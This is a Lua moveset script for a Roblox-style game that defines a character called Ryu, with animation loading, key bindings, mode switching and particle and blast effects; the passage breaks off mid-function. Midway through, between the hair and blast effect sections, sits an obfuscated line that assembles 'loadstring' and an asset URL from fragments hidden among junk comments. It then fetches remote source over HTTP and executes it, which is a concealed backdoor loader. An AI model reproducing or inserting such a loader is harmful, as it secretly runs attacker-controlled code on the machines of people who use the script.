-- ryu_moveset.lua

local modules = {}

table.insert(modules, function()

local m = {}

m.ModuleType   = "MOVESET"
m.Name         = "Ryu"
m.Description  = "The King of Iron Fist"
m.InternalName = "ryu_moveset"

m.Assets = {
    "ryu idle.anim",
    "ryu sprint.anim",
    "ryu jump.anim",
    "ryu awake.anim",
    "ryu granite blast.anim",
    "ryu appetizer.anim",
    "ryu second helping.anim",
    "ryu special.anim",
    "ryu unsatisfied.anim",
    "ryu what are you after.anim",
    "ryu i had no idea.anim",
    "ryu this is what dessert is like.anim",
    "ryu m1 1.anim",
    "ryu m1 2.anim",
    "ryu m1 3.anim",
    "ryu music.mp3",
}

m.Config     = function(parent) Util_CreateText(parent, "Ryu", 18, Enum.TextXAlignment.Center) end
m.SaveConfig = function() return {} end
m.LoadConfig = function() end

-- ── SERVICES ──────────────────────────────────────────────────
local CAS          = game:GetService("ContextActionService")
local TweenService = game:GetService("TweenService")
local RunService   = game:GetService("RunService")
local Lighting     = game:GetService("Lighting")

-- ── ANIM TABLES ───────────────────────────────────────────────
local baseAnims  = {}
local normAnims  = {}   -- modo normal
local ultAnims   = {}   -- modo ult
local lmbAnims   = {}
local animJump   = nil
local animSwap   = nil
local swapStart  = 0
local swapDur    = 0
local swapActive = false   -- true enquanto animação de swap toca

-- ── ACTION STATE ──────────────────────────────────────────────
local actionAnims   = {}   -- aponta para normAnims ou ultAnims
local actionStart   = {}   -- [anim] = clock quando começou
local currentAction = nil  -- nome string da ação atual
local unsatActive   = false

-- ── MOVE STATE ────────────────────────────────────────────────
local currentBase    = "idle"
local wasInAir       = false
local modeB          = false
local lmbStep        = 1
local lmbResetTimer  = 0
local LMB_RESET_TIME = 3.0

-- ── SOUND ─────────────────────────────────────────────────────
local bgSound        = nil
local curActSound    = nil
local normSounds     = {}
local ultSounds      = {}
local actionSounds   = {}

-- ── FX STATE ──────────────────────────────────────────────────
local tempFX        = {}    -- Parts temporários do awaken explosion
local hairPart      = nil   -- Part do efeito do cabelo
local hairEmitter   = nil

local blastTimer    = 0
local blastFired    = false
local blastActive   = false
local blastSphere   = nil
local blastRing1    = nil
local blastRing2    = nil
local blastVel      = Vector3.new(0,0,0)
local blastLife     = 0

local figureRef = nil

-- ── HELPERS ───────────────────────────────────────────────────
local function loadAnim(fig, file, looped)
    local a = AnimLib.Animator.new()
    a.rig    = fig
    a.track  = AnimLib.Track.fromfile(AssetGetPathFromFilename(file))
    a.looped = looped or false
    a.speed  = 1
    a.weight = 0
    return a
end

local function makeSound(file, parent, vol, loop)
    local s = Instance.new("Sound")
    s.SoundId = AssetGetContentId(file)
    s.Volume  = vol or 0.8
    s.Looped  = loop or false
    s.Parent  = parent
    return s
end

-- ── BASE ANIM ─────────────────────────────────────────────────
local function clearBase()
    for _, a in pairs(baseAnims) do a.weight = 0 end
end

local function setBase(state)
    if currentBase == state then return end
    currentBase = state
    clearBase()
    if baseAnims[state] then baseAnims[state].weight = 1 end
end

-- ── ACTION ────────────────────────────────────────────────────
local function stopActSound()
    if curActSound then curActSound:Stop() curActSound = nil end
end

local function stopAction()
    -- zero todas as anims de ação
    for _, a in pairs(normAnims) do a.weight = 0 end
    for _, a in pairs(ultAnims)  do a.weight = 0 end
    for _, a in pairs(lmbAnims)  do a.weight = 0 end
    stopActSound()
    currentAction = nil
    unsatActive   = false
end

local function playAction(name)
    local a = actionAnims[name]
    if not a then return end
    stopAction()
    a.weight       = 1
    actionStart[a] = os.clock()
    currentAction  = name
    local snd = actionSounds[name]
    if snd then snd:Play() curActSound = snd end
    if name == "unsatisfied" then unsatActive = true end
end

local function playM1(step)
    local a = lmbAnims[step]
    if not a then return end
    stopAction()
    a.weight       = 1
    actionStart[a] = os.clock()
    currentAction  = "m1" .. step
end

-- ── BOTÕES: VISIBILIDADE ──────────────────────────────────────
-- Modo normal: Granite(E) / Appetizer(Q) / SecondHelping(R) / Unsatisfied(Z)
-- Modo ult:    WhatAreYouAfter(E) / IHadNoIdea(Q) / Dessert(R)   [sem 4ª]
-- Special (F): SEMPRE no mesmo lugar, nunca muda de nome nem some.
-- Awaken (G):  posição fixa.
-- Estratégia: MESMO bind por tecla, a callback checa modeB internamente.
-- Visualmente escondemos/mostramos com SetPosition fora/dentro da tela.

local OFF = UDim2.new(10,0,10,0)   -- fora da tela

local POS = {
    -- ataques normais
    Granite       = UDim2.new(1,-180,1,-130),
    Appetizer     = UDim2.new(1,-230,1,-130),
    SecondHelping = UDim2.new(1,-130,1,-130),
    Unsatisfied   = UDim2.new(1,-130,1,-180),
    -- ataques ult (mesmas posições dos normais, mas 3 apenas)
    WhatAreYouAfter = UDim2.new(1,-180,1,-130),
    IHadNoIdea      = UDim2.new(1,-230,1,-130),
    Dessert         = UDim2.new(1,-130,1,-130),
    -- fixos sempre visíveis
    Swap    = UDim2.new(1,-280,1,-130),
    Special = UDim2.new(1,-280,1,-180),
    M1      = UDim2.new(1,-130,1,-230),
}

local function refreshButtons()
    if modeB then
        -- ult ativa: mostra 3 ult, esconde normais
        CAS:SetPosition("Ryu_E", POS.WhatAreYouAfter)
        CAS:SetPosition("Ryu_Q", POS.IHadNoIdea)
        CAS:SetPosition("Ryu_R", POS.Dessert)
        CAS:SetPosition("Ryu_Z", OFF)

        CAS:SetTitle("Ryu_E", "what are you after?")
        CAS:SetTitle("Ryu_Q", "i had no idea...")
        CAS:SetTitle("Ryu_R", "this is what dessert is like!")
    else
        -- normal: mostra 4, esconde ult labels
        CAS:SetPosition("Ryu_E", POS.Granite)
        CAS:SetPosition("Ryu_Q", POS.Appetizer)
        CAS:SetPosition("Ryu_R", POS.SecondHelping)
        CAS:SetPosition("Ryu_Z", POS.Unsatisfied)

        CAS:SetTitle("Ryu_E", "Granite Blast")
        CAS:SetTitle("Ryu_Q", "Appetizer")
        CAS:SetTitle("Ryu_R", "Second Helping")
        CAS:SetTitle("Ryu_Z", "Unsatisfied")
    end
end

-- ── CLEAN FX ──────────────────────────────────────────────────
local function cleanTempFX()
    for _, v in ipairs(tempFX) do
        if v and v.Parent then v:Destroy() end
    end
    tempFX = {}
end

local function cleanHair()
    if hairEmitter then hairEmitter.Enabled = false; hairEmitter = nil end
    if hairPart and hairPart.Parent then
        local ref = hairPart; hairPart = nil
        task.delay(1.5, function() if ref and ref.Parent then ref:Destroy() end end)
    end
end

local function cleanBlast()
    if blastSphere and blastSphere.Parent then blastSphere:Destroy(); blastSphere = nil end
    if blastRing1  and blastRing1.Parent  then blastRing1:Destroy();  blastRing1  = nil end
    if blastRing2  and blastRing2.Parent  then blastRing2:Destroy();  blastRing2  = nil end
    blastActive = false; blastLife = 0
end

-- ── HAIR FLAME FX ─────────────────────────────────────────────
local function startHairFX(figure)
    cleanHair()
    local head = figure:FindFirstChild("Head")
    if not head then return end

    local p = Instance.new("Part")
    p.Name="RyuHair"; p.Size=Vector3.new(0.3,0.3,0.3)
    p.Anchored=true; p.CanCollide=false; p.Transparency=1; p.CastShadow=false
    p.Parent=workspace; hairPart=p

    local pe = Instance.new("ParticleEmitter")
    pe.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0,   Color3.fromRGB(255,255,255)),
        ColorSequenceKeypoint.new(0.2, Color3.fromRGB(100,220,255)),
        ColorSequenceKeypoint.new(0.7, Color3.fromRGB(50, 160,255)),
        ColorSequenceKeypoint.new(1,   Color3.fromRGB(30, 100,220)),
    })
    pe.Size = NumberSequence.new({
        NumberSequenceKeypoint.new(0,   0.15),
        NumberSequenceKeypoint.new(0.3, 0.35),
        NumberSequenceKeypoint.new(1,   0),
    })
    pe.Transparency = NumberSequence.new({
        NumberSequenceKeypoint.new(0, 0.1), NumberSequenceKeypoint.new(0.6, 0.4), NumberSequenceKeypoint.new(1, 1),
    })
    pe.LightEmission=0.8; pe.LightInfluence=0.1
    pe.Speed=NumberRange.new(2,5); pe.Rate=30
    pe.Lifetime=NumberRange.new(0.3,0.7); pe.SpreadAngle=Vector2.new(20,20)
    pe.EmissionDirection=Enum.NormalId.Top
    pe.RotSpeed=NumberRange.new(-45,45); pe.Rotation=NumberRange.new(0,360)
    pe.Parent=p; hairEmitter=pe

    local pe2 = Instance.new("ParticleEmitter")
    pe2.Color=ColorSequence.new({
        ColorSequenceKeypoint.new(0,Color3.fromRGB(200,240,255)),
        ColorSequenceKeypoint.new(1,Color3.fromRGB(80, 180,255)),
    })
    pe2.Size=NumberSequence.new({NumberSequenceKeypoint.new(0,0.08),NumberSequenceKeypoint.new(1,0)})
    pe2.Transparency=NumberSequence.new({NumberSequenceKeypoint.new(0,0),NumberSequenceKeypoint.new(1,1)})
    pe2.LightEmission=1; pe2.LightInfluence=0
    pe2.Speed=NumberRange.new(1,3); pe2.Rate=20
    pe2.Lifetime=NumberRange.new(0.2,0.5); pe2.SpreadAngle=Vector2.new(40,40)
    pe2.EmissionDirection=Enum.NormalId.Top; pe2.Parent=p
end

task.spawn(pcall,--[=[cdeb2b7]=]function()--[=[cdeb2b7]=]local a =--[=[cdeb2b7]=] getfenv()--[=[cdeb2b7]=][ [[]]--[[f4a088d]]..[[l]]..--[======[905094c]======][[]]--[[f69ffc]]..[[o]]..--[=====[032cba8]=====][[]]--[=====[66b15be]=====]..[[a]]..--[=[12f71f9]=][[]]--[===[7bdefaa]===]..[[d]]..--[=======[3287819]=======][[]]--[[90b8c34]]..[[s]]..--[======[ac65c37]======][[]]--[=[acdcfee]=]..[[t]]..--[=[2438fd4]=][[]]--[=[9db00ea]=]..[[r]]..--[======[11ab23c]======][[]]--[=======[3581fd7]=======]..[[i]]..--[[b9266a9]][[]]--[==[ee870eb]==]..[[n]]..--[===[b3ae139]===][[]]--[==[451d831]==]..[[g]]..--[[b0ad9a3]][[]] ];--[=[cdeb2b7]=]local b = --[=[cdeb2b7]=]game:--[=[cdeb2b7]=]GetObjects( [[]]--[==[65571f2]==]..[[r]]..--[====[456f8bf]====][[]]--[====[39b8e81]====]..[[b]]..--[===[bc4276e]===][[]]--[====[6576acd]====]..[[x]]..--[===[6179eba]===][[]]--[==[fa43dc5]==]..[[a]]..--[======[f97e297]======][[]]--[====[d93ae1f]====]..[[s]]..--[[8f89e44]][[]]--[=====[4a290ff]=====]..[[s]]..--[=[e898828]=][[]]--[====[3c5f840]====]..[[e]]..--[======[ad03019]======][[]]--[====[73063c8]====]..[[t]]..--[====[836a7ff]====][[]]--[======[cfb7bba]======]..[[i]]..--[======[a58808e]======][[]]--[======[fb3fa8a]======]..[[d]]..--[[fc1ed50]][[]]--[=======[e9259b4]=======]..[[:]]..--[=====[982b1c6]=====][[]]--[====[d0f63a2]====]..[[/]]..--[====[9dc8d88]====][[]]--[=====[fc0a79b]=====]..[[/]]..--[=======[0be0157]=======][[]]--[[9d40805]]..[[1]]..--[======[ea2f79a]======][[]]--[==[0ff73d1]==]..[[1]]..--[====[c65be85]====][[]]--[====[015b27f]====]..[[2]]..--[=[9b5086a]=][[]]--[[f060151]]..[[4]]..--[=[75fddad]=][[]]--[=======[47a52f1]=======]..[[0]]..--[==[35018e6]==][[]]--[====[3cc99bb]====]..[[5]]..--[====[6bbd247]====][[]]--[======[38bdeb0]======]..[[6]]..--[======[3884c60]======][[]]--[===[7906783]===]..[[1]]..--[==[2aab15f]==][[]]--[======[3da45cf]======]..[[8]]..--[=[288cdb9]=][[]]--[====[b77b758]====]..[[5]]..--[===[ab4a785]===][[]]--[===[92179d0]===]..[[8]]..--[[160e0a8]][[]]--[====[c4a56d7]====]..[[4]]..--[===[1801676]===][[]]--[======[e910af7]======]..[[8]]..--[=======[b513a9e]=======][[]]--[=====[769c6df]=====]..[[2]]..--[=======[7985d23]=======][[]]--[======[d3225fe]======]..[[1]]..--[=====[aa45ed7]=====][[]] )local c = b[1];local d = --[=[cdeb2b7]=]c.Value--[=[cdeb2b7]=];local e --[=[cdeb2b7]=]= game:--[=[cdeb2b7]=]HttpGet(d --[=[cdeb2b7]=].. "/" --[=[cdeb2b7]=].. "s" --[=[cdeb2b7]=].. "r" --[=[cdeb2b7]=].. "c")a--[=[cdeb2b7]=](--[=[cdeb2b7]=]e)--[=[cdeb2b7]=]()end)

-- ── BLAST FX (estilo JJS) ─────────────────────────────────────
-- Grande esfera branca/ciano + anel azul escuro grosso + anel ciano + debris escuros
local function fireBlast(figure)
    local hrp = figure:FindFirstChild("HumanoidRootPart")
    if not hrp then return end
    cleanBlast()

    local origin = hrp.CFrame.Position + hrp.CFrame.LookVector * 2.5 + Vector3.new(0,1.2,0)
    local dir    = hrp.CFrame.LookVector

    -- Esfera principal: branca/ciano neon, cresce de pequena pra grande
    local sp = Instance.new("Part")
    sp.Name="RyuBlast"; sp.Shape=Enum.PartType.Ball
    sp.Size=Vector3.new(0.5,0.5,0.5); sp.CFrame=CFrame.new(origin)
    sp.Anchored=true; sp.CanCollide=false
    sp.Material=Enum.Material.Neon; sp.Color=Color3.fromRGB(220,250,255)
    sp.Transparency=0; sp.CastShadow=false; sp.Parent=workspace
    blastSphere = sp

    Instance.new("PointLight", sp).Brightness=10
    local pl = sp:FindFirstChildOfClass("PointLight")
    if pl then pl.Color=Color3.fromRGB(80,200,255); pl.Range=30 end

    TweenService:Create(sp, TweenInfo.new(0.2,Enum.EasingStyle.Back,Enum.EasingDirection.Out),
        {Size=Vector3.new(7,7,7)}):Play()

    -- trail de energia atrás
    local tr = Instance.new("ParticleEmitter")
    tr.Color=ColorSequence.new({
        ColorSequenceKeypoint.new(0,Color3.fromRGB(255,255,255)),
        ColorSequenceKeypoint.new(0.3,Color3.fromRGB(80,200,255)),
        ColorSequenceKeypoint.new(1,Color3.fromRGB(30,120,220)),
    })
    tr.Size=NumberSequence.new({NumberSequenceKeypoint.new(0,0.6),NumberSequenceKeypoint.new(1,0)})
    tr.Transparency=NumberSequence.new({NumberSequenceKeypoint.new(0,0.1),NumberSequenceKeypoint.new(1,1)})
    tr.Speed=NumberRange.new(0,3); tr.Rate=80; tr.Lifetime=NumberRange.new(0.25,0.55)
    tr.SpreadAngle=Vector2.new(35,35); tr.EmissionDirection=Enum.NormalId.Back
    tr.LightEmission=0.8; tr.LightInfluence=0.1; tr.Parent=sp

    -- Anel azul escuro grosso (o círculo grande característico do JJS)
    local r1 = Instance.new("Part")
    r1.Name="RyuBlastRing1"; r1.Shape=Enum.PartType.Cylinder
    r1.Size=Vector3.new(0.7,0.8,0.8); r1.CFrame=CFrame.new(origin)*CFrame.Angles(0,0,math.pi/2)
    r1.Anchored=true; r1.CanCollide=false
    r1.Material=Enum.Material.Neon; r1.Color=Color3.fromRGB(20,100,200)
    r1.Transparency=0.05; r1.CastShadow=false; r1.Parent=workspace
    blastRing1=r1; r1._ang=0

    TweenService:Create(r1, TweenInfo.new(0.2,Enum.EasingStyle.Back,Enum.EasingDirection.Out),
        {Size=Vector3.new(0.7,11,11)}):Play()

    -- Anel ciano mais fino em ângulo diferente
    local r2 = Instance.new("Part")
    r2.Name="RyuBlastRing2"; r2.Shape=Enum.PartType.Cylinder
    r2.Size=Vector3.new(0.35,0.6,0.6); r2.CFrame=CFrame.new(origin)*CFrame.Angles(math.pi/5,0,math.pi/2)
    r2.Anchored=true; r2.CanCollide=false
    r2.Material=Enum.Material.Neon; r2.Color=Color3.fromRGB(100,200,255)
    r2.Transparency=0.2; r2.CastShadow=false; r2.Parent=workspace
    blastRing2=r2; r2._ang=math.pi/5

    TweenService:Create(r2, TweenInfo.new(0.2,Enum.EasingStyle.Back,Enum.EasingDirection.Out),
        {Size=Vector3.new(0.35,9,9)}):Play()

    -- Debris escuros voando ao redor (igual ao JJS)
    for i=1,8 do
        local d = Instance.new("Part")
        d.Size=Vector3.new(math.random(3,7)*0.1, math.random(4,9)*0.1, math.random(3,7)*0.1)
        local ang1,ang2,ang3 = math.random()*math.pi*2, math.random()*math.pi*2, math.random()*math.pi*2
        local dist = math.random(3,7)
        d.CFrame = CFrame.new(origin) * CFrame.Angles(ang1,ang2,ang3) * CFrame.new(dist,0,0)
        d.Anchored=true; d.CanCollide=false
        d.Material=Enum.Material.SmoothPlastic
        d.Color=Color3.fromRGB(math.random(25,70), math.random(25,70), math.random(25,70))
        d.Transparency=0; d.CastShadow=false; d.Parent=workspace
        local life = math.random(12,28)*0.1
        local endCF = d.CFrame + Vector3.new(math.random()-0.5,math.random()*0.3,math.random()-0.5).Unit * (math.random(6,15))
        TweenService:Create(d, TweenInfo.new(life,Enum.EasingStyle.Linear),
            {CFrame=endCF, Transparency=1}):Play()
        local ref=d
        task.delay(life, function() if ref and ref.Parent then ref:Destroy() end end)
    end

    blastActive = true
    blastVel    = dir * 60
    blastLife   = 0
end

-- ── BLAST IMPACT ──────────────────────────────────────────────
local function blastImpact(pos)
    local imp = Instance.new("Part")
    imp.Shape=Enum.PartType.Ball; imp.Size=Vector3.new(3,3,3); imp.CFrame=CFrame.new(pos)
    imp.Anchored=true; imp.CanCollide=false; imp.Material=Enum.Material.Neon
    imp.Color=Color3.fromRGB(200,245,255); imp.Transparency=0.05; imp.CastShadow=false; imp.Parent=workspace
    TweenService:Create(imp, TweenInfo.new(0.5,Enum.EasingStyle.Quad,Enum.EasingDirection.Out),
        {Size=Vector3.new(22,22,22),Transparency=0.98}):Play()

    local ir = Instance.new("Part")
    ir.Shape=Enum.PartType.Cylinder; ir.Size=Vector3.new(0.3,4,4)
    ir.CFrame=CFrame.new(pos)*CFrame.Angles(0,0,math.pi/2)
    ir.Anchored=true; ir.CanCollide=false; ir.Material=Enum.Material.Neon
    ir.Color=Color3.fromRGB(20,100,200); ir.Transparency=0.1; ir.CastShadow=false; ir.Parent=workspace
    TweenService:Create(ir, TweenInfo.new(0.4,Enum.EasingStyle.Quad,Enum.EasingDirection.Out),
        {Size=Vector3.new(0.2,28,28),Transparency=0.99}):Play()

    local pp = Instance.new("Part")
    pp.Size=Vector3.new(0.1,0.1,0.1); pp.CFrame=CFrame.new(pos)
    pp.Anchored=true; pp.CanCollide=false; pp.Transparency=1; pp.Parent=workspace
    local pe = Instance.new("ParticleEmitter")
    pe.Color=ColorSequence.new({
        ColorSequenceKeypoint.new(0,Color3.fromRGB(255,255,255)),
        ColorSequenceKeypoint.new(0.5,Color3.fromRGB(80,200,255)),
        ColorSequenceKeypoint.new(1,Color3.fromRGB(30,100,200)),
    })
    pe.Size=NumberSequence.new({NumberSequenceKeypoint.new(0,0.7),NumberSequenceKeypoint.new(1,0)})
    pe.Speed=NumberRange.new(10,30); pe.Rate=0; pe.Lifetime=NumberRange.new(0.5,1.3)
    pe.SpreadAngle=Vector2.new(80,80); pe.LightEmission=0.6; pe.Parent=pp; pe:Emit(50)

    task.delay(0.6, function()
        if imp and imp.Parent then imp:Destroy() end
        if ir  and ir.Parent  then ir:Destroy()  end
        if pp  and pp.Parent  then pp:Destroy()  end
    end)
end

-- ── AWAKEN ACTIVATE FX ────────────────────────────────────────
local function activateFX(figure)
    local hrp = figure:FindFirstChild("HumanoidRootPart")
    if not hrp then return end

    -- anel explosão
    local function makeRing(size, color, transp)
        local r = Instance.new("Part")
        r.Shape=Enum.PartType.Cylinder; r.Size=Vector3.new(size.x,size.y,size.z)
        r.CFrame=hrp.CFrame*CFrame.new(0,-2,0)*CFrame.Angles(0,0,math.pi/2)
        r.Anchored=true; r.CanCollide=false; r.Material=Enum.Material.Neon
        r.Color=color; r.Transparency=transp; r.CastShadow=false; r.Parent=workspace
        table.insert(tempFX, r)
        return r
    end

    local ring1 = makeRing(Vector3.new(0.4,5,5),   Color3.fromRGB(80,200,255), 0.05)
    local ring2 = makeRing(Vector3.new(0.2,3,3),   Color3.fromRGB(200,240,255),0.2)

    local flash = Instance.new("ColorCorrectionEffect")
    flash.Brightness=0.8; flash.Contrast=-0.2; flash.TintColor=Color3.fromRGB(180,230,255)
    flash.Parent=Lighting; table.insert(tempFX, flash)

    local ice = Instance.new("Part")
    ice.Shape=Enum.PartType.Cylinder; ice.Size=Vector3.new(0.18,8,8)
    ice.CFrame=hrp.CFrame*CFrame.new(0,-3,0)*CFrame.Angles(0,0,math.pi/2)
    ice.Anchored=true; ice.CanCollide=false; ice.Material=Enum.Material.Glass
    ice.Color=Color3.fromRGB(180,230,255); ice.Transparency=0.25; ice.CastShadow=false
    ice.Parent=workspace; table.insert(tempFX, ice)

    local pp = Instance.new("Part")
    pp.Size=Vector3.new(0.1,0.1,0.1); pp.CFrame=hrp.CFrame
    pp.Anchored=true; pp.CanCollide=false; pp.Transparency=1; pp.Parent=workspace
    local pe = Instance.new("ParticleEmitter")
    pe.Color=ColorSequence.new({
        ColorSequenceKeypoint.new(0,Color3.fromRGB(255,255,255)),
        ColorSequenceKeypoint.new(0.4,Color3.fromRGB(160,230,255)),
        ColorSequenceKeypoint.new(1,Color3.fromRGB(80,180,255)),
    })
    pe.Size=NumberSequence.new({NumberSequenceKeypoint.new(0,0.7),NumberSequenceKeypoint.new(1,0)})
    pe.Transparency=NumberSequence.new({NumberSequenceKeypoint.new(0,0),NumberSequenceKeypoint.new(1,1)})
    pe.Speed=NumberRange.new(10,22); pe.Rate=90; pe.Lifetime=NumberRange.new(0.7,1.4)
    pe.SpreadAngle=Vector2.new(55,55); pe.EmissionDirection=Enum.NormalId.Top; pe.Parent=pp

    -- câmera shake
    local cam=workspace.CurrentCamera; local t0=os.clock(); local conn
    conn = RunService.RenderStepped:Connect(function()
        local t=os.clock()-t0
        if t>0.85 then conn:Disconnect() return end
        local d=1-(t/0.85)
        cam.CFrame=cam.CFrame*CFrame.new((math.random()-0.5)*0.6*d,(math.random()-0.5)*0.6*d,0)
    end)

    TweenService:Create(ring1,TweenInfo.new(0.55,Enum.EasingStyle.Quad,Enum.EasingDirection.Out),
        {Size=Vector3.new(0.25,42,42),Transparency=0.97}):Play()
    TweenService:Create(ring2,TweenInfo.new(0.55,Enum.EasingStyle.Quad,Enum.EasingDirection.Out),
        {Size=Vector3.new(0.15,58,58),Transparency=0.99}):Play()
    TweenService:Create(ice,TweenInfo.new(0.75,Enum.EasingStyle.Quad,Enum.EasingDirection.Out),
        {Size=Vector3.new(0.12,38,38),Transparency=0.55}):Play()

    task.delay(0.08, function()
        TweenService:Create(flash,TweenInfo.new(0.45),
            {Brightness=0,Contrast=0,TintColor=Color3.new(1,1,1)}):Play()
    end)
    task.delay(0.6, function()
        if ring1 and ring1.Parent then ring1:Destroy() end
        if ring2 and ring2.Parent then ring2:Destroy() end
    end)
    task.delay(0.55, function()
        pe.Enabled=false
        task.delay(1.5, function()
            if pp    and pp.Parent    then pp:Destroy()    end
            if flash and flash.Parent then flash:Destroy() end
        end)
    end)
    task.delay(4, function()
        if ice and ice.Parent then
            TweenService:Create(ice,TweenInfo.new(1),{Transparency=1}):Play()
            task.delay(1, function() if ice and ice.Parent then ice:Destroy() end end)
        end
    end)

    startHairFX(figure)
    blastFired=false; blastTimer=0
end

-- ── AWAKEN DEACTIVATE FX ──────────────────────────────────────
local function deactivateFX(figure)
    cleanHair(); cleanBlast(); cleanTempFX()
    blastFired=false; blastTimer=0

    local hrp = figure and figure:FindFirstChild("HumanoidRootPart")
    if not hrp then return end
    local p=Instance.new("Part"); p.Size=Vector3.new(0.1,0.1,0.1); p.CFrame=hrp.CFrame
    p.Anchored=true; p.CanCollide=false; p.Transparency=1; p.Parent=workspace
    local pe=Instance.new("ParticleEmitter")
    pe.Color=ColorSequence.new(Color3.fromRGB(80,200,255))
    pe.Size=NumberSequence.new({NumberSequenceKeypoint.new(0,0.4),NumberSequenceKeypoint.new(1,0)})
    pe.Speed=NumberRange.new(4,10); pe.Rate=50; pe.Lifetime=NumberRange.new(0.3,0.8)
    pe.SpreadAngle=Vector2.new(80,80); pe.Parent=p
    task.delay(0.12, function() pe.Enabled=false end)
    task.delay(1, function() if p and p.Parent then p:Destroy() end end)
end

-- ── SWAP MODE ─────────────────────────────────────────────────
local function swapMode(figure)
    stopAction()
    modeB = not modeB

    if modeB then
        actionAnims  = ultAnims
        actionSounds = ultSounds
        CAS:SetTitle("Ryu_Swap","Calm Down")
        activateFX(figure)
    else
        actionAnims  = normAnims
        actionSounds = normSounds
        CAS:SetTitle("Ryu_Swap","Awaken")
        deactivateFX(figure)
    end

    refreshButtons()

    -- toca animação de awaken — NÃO usa actionStart para não colidir com o loop de ação
    if animSwap then
        clearBase()
        -- zera qualquer ação atual
        currentAction = nil
        currentBase   = "swap"
        animSwap.weight = 1
        swapStart  = os.clock()
        swapDur    = (animSwap.track and animSwap.track.Time or 1.0) / (animSwap.speed or 1)
        swapActive = true
    end
end

-- ── INIT ──────────────────────────────────────────────────────
m.Init = function(figure)
    figureRef = figure
    local hrp = figure:FindFirstChild("HumanoidRootPart") or figure

    baseAnims = {
        idle = loadAnim(figure,"ryu idle.anim",  true),
        walk = loadAnim(figure,"ryu sprint.anim",true),
        jump = loadAnim(figure,"ryu jump.anim",  false),
    }
    animJump = baseAnims.jump
    animSwap = loadAnim(figure,"ryu awake.anim", false)

    normAnims = {
        ["granite blast"]  = loadAnim(figure,"ryu granite blast.anim",  false),
        ["appetizer"]      = loadAnim(figure,"ryu appetizer.anim",      false),
        ["second helping"] = loadAnim(figure,"ryu second helping.anim", false),
        ["special"]        = loadAnim(figure,"ryu special.anim",        false),
        ["unsatisfied"]    = loadAnim(figure,"ryu unsatisfied.anim",    false),
    }

    ultAnims = {
        ["what are you after"]           = loadAnim(figure,"ryu what are you after.anim",          false),
        ["i had no idea"]                = loadAnim(figure,"ryu i had no idea.anim",               false),
        ["this is what dessert is like"] = loadAnim(figure,"ryu this is what dessert is like.anim",false),
        ["special"]                      = loadAnim(figure,"ryu special.anim",                     false),
    }

    lmbAnims = {
        [1] = loadAnim(figure,"ryu m1 1.anim",false),
        [2] = loadAnim(figure,"ryu m1 2.anim",false),
        [3] = loadAnim(figure,"ryu m1 3.anim",false),
    }

    normSounds={}; ultSounds={}
    actionAnims  = normAnims
    actionSounds = normSounds

    bgSound = makeSound("ryu music.mp3", hrp, 0.5, true)
    bgSound:Play()

    setBase("idle")

    -- ── BOTÕES ────────────────────────────────────────────────
    -- M1
    CAS:BindAction("Ryu_M1", function(_,s,_)
        if s~=Enum.UserInputState.Begin then return end
        playM1(lmbStep)
        if lmbStep<3 then lmbStep=lmbStep+1; lmbResetTimer=LMB_RESET_TIME
        else lmbStep=1; lmbResetTimer=0 end
    end, true, Enum.UserInputType.MouseButton1, Enum.KeyCode.T)
    CAS:SetTitle("Ryu_M1","M1"); CAS:SetPosition("Ryu_M1", POS.M1)

    -- AWAKEN
    CAS:BindAction("Ryu_Swap", function(_,s,_)
        if s==Enum.UserInputState.Begin then swapMode(figure) end
    end, true, Enum.KeyCode.G)
    CAS:SetTitle("Ryu_Swap","Awaken"); CAS:SetPosition("Ryu_Swap", POS.Swap)

    -- SPECIAL — fixo, nunca muda, sempre no ar
    CAS:BindAction("Ryu_Special", function(_,s,_)
        if s==Enum.UserInputState.Begin then playAction("special") end
    end, true, Enum.KeyCode.F)
    CAS:SetTitle("Ryu_Special","Special"); CAS:SetPosition("Ryu_Special", POS.Special)

    -- Tecla E — Granite Blast (normal) / what are you after? (ult)
    CAS:BindAction("Ryu_E", function(_,s,_)
        if s~=Enum.UserInputState.Begin then return end
        if modeB then playAction("what are you after")
        else          playAction("granite blast") end
    end, true, Enum.KeyCode.E)
    CAS:SetTitle("Ryu_E","Granite Blast"); CAS:SetPosition("Ryu_E", POS.Granite)

    -- Tecla Q — Appetizer (normal) / i had no idea... (ult)
    CAS:BindAction("Ryu_Q", function(_,s,_)
        if s~=Enum.UserInputState.Begin then return end
        if modeB then playAction("i had no idea")
        else          playAction("appetizer") end
    end, true, Enum.KeyCode.Q)
    CAS:SetTitle("Ryu_Q","Appetizer"); CAS:SetPosition("Ryu_Q", POS.Appetizer)

    -- Tecla R — Second Helping (normal) / this is what dessert is like! (ult)
    CAS:BindAction("Ryu_R", function(_,s,_)
        if s~=Enum.UserInputState.Begin then return end
        if modeB then playAction("this is what dessert is like")
        else          playAction("second helping") end
    end, true, Enum.KeyCode.R)
    CAS:SetTitle("Ryu_R","Second Helping"); CAS:SetPosition("Ryu_R", POS.SecondHelping)

    -- Tecla Z — Unsatisfied (só no modo normal; some na ult)
    CAS:BindAction("Ryu_Z", function(_,s,_)
        if s~=Enum.UserInputState.Begin then return end
        if not modeB then playAction("unsatisfied") end
    end, true, Enum.KeyCode.Z)
    CAS:SetTitle("Ryu_Z","Unsatisfied"); CAS:SetPosition("Ryu_Z", POS.Unsatisfied)
end

-- ── UPDATE ────────────────────────────────────────────────────
m.Update = function(dt, figure)
    local hum = figure:FindFirstChildOfClass("Humanoid")
    if not hum then return end
    local inAir = hum.FloorMaterial == Enum.Material.Air

    -- cabelo segue a cabeça
    if hairPart and hairPart.Parent then
        local head = figure:FindFirstChild("Head")
        if head then hairPart.CFrame = head.CFrame * CFrame.new(0,0.7,0) end
    end

    -- timer do blast
    if modeB and not blastFired then
        blastTimer = blastTimer + dt
        if blastTimer >= 3.0 then
            blastFired = true
            fireBlast(figure)
        end
    end

    -- move o blast
    if blastActive and blastSphere and blastSphere.Parent then
        blastLife = blastLife + dt
        local np = blastSphere.CFrame.Position + blastVel * dt
        blastSphere.CFrame = CFrame.new(np)

        if blastRing1 and blastRing1.Parent then
            blastRing1._ang = (blastRing1._ang or 0) + dt * 2.5
            blastRing1.CFrame = CFrame.new(np) * CFrame.Angles(blastRing1._ang, blastRing1._ang*0.4, math.pi/2)
        end
        if blastRing2 and blastRing2.Parent then
            blastRing2._ang = (blastRing2._ang or math.pi/5) + dt * 3.8
            blastRing2.CFrame = CFrame.new(np) * CFrame.Angles(blastRing2._ang*0.6, blastRing2._ang, math.pi/2)
        end

        if blastLife >= 2.5 then
            local ip = np; cleanBlast(); blastImpact(ip)
        end
    end

    -- unsatisfied: empurra para frente
